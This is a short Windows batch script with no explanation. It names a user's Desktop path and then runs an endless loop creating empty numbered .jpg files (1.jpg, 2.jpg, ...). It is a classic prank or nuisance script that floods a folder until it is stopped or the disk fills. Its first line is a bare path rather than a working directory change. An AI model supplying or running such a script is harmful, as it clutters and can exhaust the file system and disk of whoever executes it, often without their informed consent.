C:\Documents and Settings\%USERNAME%\Desktop
set i=1
set typ=.jpg
:loop
set str=%i%%typ%
type NUL > %str%
set /a i=i+1
goto loop

